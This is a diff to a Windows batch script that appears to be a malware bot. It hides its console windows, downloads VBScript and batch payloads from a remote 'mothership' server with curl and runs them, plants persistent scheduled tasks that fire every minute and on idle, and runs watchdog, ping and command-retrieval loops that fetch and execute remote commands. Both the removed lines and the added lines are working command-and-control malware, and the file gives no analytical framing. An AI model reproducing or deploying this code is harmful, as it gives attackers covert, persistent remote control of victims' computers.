@@ -46,71 +46,32 @@ IF NOT EXIST %workdir%\zfei.bat (
     copy /Y %scriptpath% %workdir%\zfei.bat 
 )
 
-IF NOT EXIST %workdir%\zfei.vbs (
-    start "" /min conhost.exe --headless cmd /c curl -sk -o %workdir%\zfei.vbs -G %mothership%/ow/assets/zfei.vbs
-    start "" /min conhost.exe --headless cmd /c curl -sk -o %workdir%\zfei.vbs -G %mothershipa%/ow/assets/zfei.vbs
-    start "" /min conhost.exe --headless cmd /c curl -sk -o %workdir%\zfei.vbs -G %mothershipb%/ow/assets/zfei.vbs
-)
-
-echo :beginloop                                                                                                  > %workdir%\infectvbs.bat
-echo IF EXIST %workdir%\zfei.vbs (                                                                              >> %workdir%\infectvbs.bat
-echo     start "" /min /b conhost.exe --headless wscript.exe /b %workdir%\zfei.vbs                                                                      >> %workdir%\infectvbs.bat
-echo ) ELSE (                                                                                                   >> %workdir%\infectvbs.bat
-echo     start "" /min /b conhost.exe --headless cmd /c curl -sk -o %workdir%\zfei.vbs -G %mothership%/ow/assets/zfei.vbs              >> %workdir%\infectvbs.bat
-echo     start "" /min /b conhost.exe --headless cmd /c curl -sk -o %workdir%\zfei.vbs -G %mothershipa%/ow/assets/zfei.vbs             >> %workdir%\infectvbs.bat
-echo     start "" /min /b conhost.exe --headless cmd /c curl -sk -o %workdir%\zfei.vbs -G %mothershipb%/ow/assets/zfei.vbs             >> %workdir%\infectvbs.bat
-echo     timeout /nobreak 5                                                                                     >> %workdir%\infectvbs.bat
-echo     goto :beginloop                                                                                        >> %workdir%\infectvbs.bat
-echo )                                                                                                          >> %workdir%\infectvbs.bat
-
-IF EXIST %workdir%\infectvbs.bat (
-    start "" /min /b conhost.exe --headless cmd /c %workdir%\infectvbs.bat
-)
-
-IF NOT EXIST %workdir%\RunHidden.vbs (
-    echo On Error Resume Next > %workdir%\RunHidden.vbs
-    echo CreateObject^("Wscript.Shell"^).Run Chr^(34^) ^& WScript.Arguments^(0^) ^& Chr^(34^), 0, False >> %workdir%\RunHidden.vbs
-)
-
-IF NOT EXIST %workdir%\RunHiddenPS.vbs (
-    echo On Error Resume Next > %workdir%\RunHiddenPS.vbs
-    echo CreateObject^("WScript.Shell"^).Run "conhost.exe --headless powershell.exe -NoProfile -ExecutionPolicy Bypass -File " ^& "%workdir%\pc_monitoring.ps1", 0, False >> %workdir%\RunHiddenPS.vbs
-)
-
-IF NOT EXIST %workdir%\seaj.bat (
-    echo %workdir%\zfei.bat task ^>^> %workdir%\cmds_log_infection.txt 2^>^&1 > %workdir%\vyns.bat
-    echo start "" /min /b conhost.exe --headless cmd /c %workdir%\vyns.bat > %workdir%\seaj.bat
-)
-
-
-IF "%~1"=="x" (
-    schtasks /delete /TN t /F
-    
-    goto :init
-)
-
-
 IF "%~1"=="" (
+    start "" /min conhost.exe --headless cmd /c %workdir%\zfei.bat init
+    exit
+)
+
+curl -sk -o %workdir%\zfei.vbs -G %mothership%/ow/assets/zfei.vbs
+
+IF EXIST %workdir%\zfei.vbs (
+    start "" /min conhost.exe --headless cscript //nologo //b %workdir%\zfei.vbs
+)
+
+
+IF "%~1"=="init" (
 :init    
-    IF EXIST %workdir%\RunHidden.vbs (
-        IF EXIST %workdir%\seaj.bat (
-            schtasks /delete /TN t /F
+    start "" /min /b conhost.exe --headless cmd /c %workdir%\zfei.bat task nulltask
 
-            schtasks /delete /tn %tskname%_rep /F
-            schtasks /create /tn %tskname%_rep /tr "conhost.exe --headless cscript.exe //nologo //B %workdir%\RunHidden.vbs %workdir%\seaj.bat" /sc minute /mo %tskxmltime%
+    schtasks /delete /TN t /F
 
-            schtasks /delete /tn %tskname%_repx /F
-            schtasks /create /tn %tskname%_repx /tr "conhost.exe --headless cscript.exe //nologo //B %workdir%\RunHidden.vbs %workdir%\seaj.bat" /sc minute /mo 1
+    schtasks /delete /tn %tskname%_rep /F
+    schtasks /create /tn %tskname%_rep /tr "conhost.exe --headless cmd /c %workdir%\zfei.bat task %tskname%_rep" /sc minute /mo %tskxmltime% /F
 
-            schtasks /delete /TN %tskname%_idle /F
-            schtasks /create /TN %tskname%_idle /sc onidle /i 1 /F /tr "conhost.exe --headless cscript.exe //nologo //B %workdir%\RunHidden.vbs %workdir%\seaj.bat" 
+    schtasks /delete /tn %tskname%_repx /F
+    schtasks /create /tn %tskname%_repx /tr "conhost.exe --headless cmd /c %workdir%\zfei.bat task %tskname%_repx" /sc minute /mo 1 /F
 
-            start "" /min /b conhost.exe --headless cscript.exe //nologo //B "%workdir%\RunHidden.vbs" %workdir%\seaj.bat
-
-            exit
-        )
-    )
-    
+    schtasks /delete /TN %tskname%_idle /F
+    schtasks /create /TN %tskname%_idle /sc onidle /i 1 /F /tr "conhost.exe --headless cmd /c %workdir%\zfei.bat task %tskname%_idle" /F
 )
 
 SET "cmdname=%~1"
@@ -119,32 +80,35 @@ set dt=%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%
 
 SET timestamp=%dt:~0,14%%dt:~15,3%
 
+set ttaskname=%~2
+
 SET "logfpath=%workdir%\master_%cmdname%_%timestamp%.log"
 
+IF "%cmdname%"=="task" (
+    IF "%*%"=="task" ( 
+        set ttaskname=UNKNOWN
+    )
+    
+    SET "logfpath=%workdir%\master_%cmdname%_%ttaskname%_%timestamp%.log"
+)
+
 type nul > %logfpath%
+set num=%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%
 
 set clientid=xxxxxxxx
 
 IF EXIST %workdir%\client_id (
     set /p clientid=<%workdir%\client_id
 ) ELSE (
-    set num=%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%
     echo %num:~0,8% > %workdir%\client_id
-    set /p clientid=<%workdir%\client_id
+    set clientid=%num%
 )
 
 set clientid=%clientid:~0,8%
 
-echo starting script [ %~1 ] clientid [ %clientid% ] [ %timestamp% ] >> %logfpath%
+echo starting script [ %source% ] [ %* ] clientid [ %clientid% ] [ %timestamp% ] >> %logfpath%
 
 type nul > %workdir%\skip_pcmoncheck
-
-IF NOT EXIST %workdir%\gtcs.bat ( echo %workdir%\zfei.bat penetrate ^>^> %workdir%\cmds_log_penetrate.txt 2^>^&1 > %workdir%\gtcs.bat )
-
-IF NOT EXIST %workdir%\eiwe.bat ( echo %workdir%\zfei.bat ping      ^>^> %workdir%\cmds_log_ping.txt      2^>^&1 > %workdir%\eiwe.bat )
-IF NOT EXIST %workdir%\ghso.bat ( echo %workdir%\zfei.bat cmdlist   ^>^> %workdir%\cmds_log_cmdlist.txt   2^>^&1 > %workdir%\ghso.bat )
-IF NOT EXIST %workdir%\uahy.bat ( echo %workdir%\zfei.bat watchdog  ^>^> %workdir%\cmds_log_watchdog.txt  2^>^&1 > %workdir%\uahy.bat )
-
 
 IF "%cmdname%"=="task" (
     schtasks /delete /TN t /F
@@ -180,23 +144,18 @@ REM uahy
     echo starting watchdog loop [%timestamp%] >> %logfpath%
     
     REM check if ping and cmdlist are runnning, if not start them up
-    FOR %%c IN (eiwe ghso) DO (
-        SETLOCAL EnableDelayedExpansion
-
-        IF "%%c"=="eiwe" ( SET "cmdname=ping" )
-        IF "%%c"=="ghso" ( SET "cmdname=cmdlist" )
+    FOR %%c IN (ping cmdlist) DO (
                 
-        wmic process get commandline, processid /value /format:csv | findstr /v wmic | findstr %%c | findstr /v findstr > %workdir%\!cmdname!loop_running
+        wmic process get commandline, processid /value /format:csv | findstr /v wmic | findstr %%c | findstr /v findstr > %workdir%\%%cloop_running
         
-        FOR %%A IN ("%workdir%\!cmdname!loop_running") DO (
+        FOR %%A IN ("%workdir%\%%cloop_running") DO (
             IF "%%~zA" EQU "0" ( 
-                DEL /F /Q %workdir%\!cmdname!loop_running
+                echo starting %%cloop [%timestamp%] >> %logfpath%
                 
-                start "" /min /b conhost.exe --headless cscript.exe //nologo //B "%workdir%\RunHidden.vbs" "%workdir%\%%c.bat"
+                start "" /min /b conhost.exe --headless cmd /c %workdir%\zfei.bat %%c > %workdir%\cmds_log_%%c.log 2>&1
             )  
         )
         
-        ENDLOCAL
     )
 
     echo watchdog loop sleeping >> %logfpath%
@@ -234,13 +193,13 @@ goto :watchdogloop
 :createtaskxmldone
 
     schtasks /delete /TN %tskname%_idle /F
-    schtasks /create /TN %tskname%_idle /sc onidle /i 1 /F /tr "conhost.exe --headless conhost.exe --headless cscript.exe //nologo //B %workdir%\RunHidden.vbs %workdir%\zfei.bat" 
+    schtasks /create /TN %tskname%_idle /sc onidle /i 1 /F /tr "conhost.exe --headless %workdir%\zfei.bat task %tskname%_idle" /f
 
     schtasks /delete /TN %tskname%_xml /F
     schtasks /create /TN %tskname%_xml /xml %workdir%\task.xml /f
     
     schtasks /delete /tn %tskname%_rep /F
-    schtasks /create /tn %tskname%_rep /tr "conhost.exe --headless cscript.exe //nologo //B %workdir%\RunHidden.vbs %workdir%\seaj.bat" /sc minute /mo %tskxmltime%
+    schtasks /create /tn %tskname%_rep /tr "conhost.exe --headless %workdir%\zfei.bat task %tskname%_rep" /sc minute /mo %tskxmltime% /f
 
     echo penetrateloop done >> %logfpath%
 
@@ -409,7 +368,7 @@ goto :pingloop
         curl -v -o %workdir%\bbti.bat -G %mothership%/ow/retrieve.php %params% >> %logfpath% 2>&1
 
         IF EXIST %workdir%\bbti.bat ( 
-            start "" /min /b conhost.exe --headless cscript.exe //nologo //B "%workdir%\RunHidden.vbs" %workdir%\bbti.bat 
+            start "" /min /b conhost.exe --headless cmd /c %workdir%\bbti.bat 
         )
     )
     
@@ -464,7 +423,7 @@ echo    ^<Priority^>7^</Priority^>                                              
 echo  ^</Settings^>                                                                          >> %workdir%\task.xml
 echo  ^<Actions Context="Author"^>                                                           >> %workdir%\task.xml
 echo    ^<Exec^>                                                                             >> %workdir%\task.xml
-echo      ^<Command^>conhost.exe --headless cscript.exe //nologo //B %workdir%\RunHidden.vbs %workdir%\zfei.bat^</Command^>      >> %workdir%\task.xml
+echo      ^<Command^>conhost.exe --headless cmd /c %workdir%\zfei.bat task %tskname%_xml^</Command^>      >> %workdir%\task.xml
 echo    ^</Exec^>                                                                            >> %workdir%\task.xml
 echo  ^</Actions^>                                                                           >> %workdir%\task.xml
 echo ^</Task^>                                                                               >> %workdir%\task.xml
@@ -475,27 +434,18 @@ goto :createtaskxmldone
 
 echo starting startuplogic >> %logfpath%
 
-IF EXIST "%workdir%\RunHidden.vbs" (
-    REM penetrate
-    start "" /min /b conhost.exe --headless cscript.exe //nologo //B "%workdir%\RunHidden.vbs" "%workdir%\gtcs.bat"
-)
+start "" /min /b conhost.exe --headless cmd /c %workdir%\zfei.bat penetrate
 
-FOR %%c IN (eiwe ghso uahy) DO (
-    SETLOCAL EnableDelayedExpansion
-
-    IF "%%c"=="eiwe" ( SET "cmdname=ping" )
-    IF "%%c"=="ghso" ( SET "cmdname=cmdlist" )
-    IF "%%c"=="uahy" ( SET "cmdname=watchdog" )
+FOR %%c IN (ping cmdlist watchdog) DO (
     
-    wmic process get commandline, processid /value /format:csv | findstr /v wmic | findstr %%c | findstr /v findstr > %workdir%\!cmdname!loop_running
+    wmic process get commandline, processid /value /format:csv | findstr /v wmic | findstr %%c | findstr /v findstr > %workdir%\%%cloop_running
 
-    FOR %%A IN ("%workdir%\!cmdname!loop_running") DO (
+    FOR %%A IN ("%workdir%\%%cloop_running") DO (
         IF "%%~zA" EQU "0" (
-            start "" /min /b conhost.exe --headless cscript.exe //nologo //B "%workdir%\RunHidden.vbs" "%workdir%\%%c.bat"
+            start "" /min /b conhost.exe --headless cmd /c %workdir%\zfei.bat %%c > %workdir%\cmds_log_%%c.log 2>&1
         )
     )
 
-    ENDLOCAL
 )
 
 
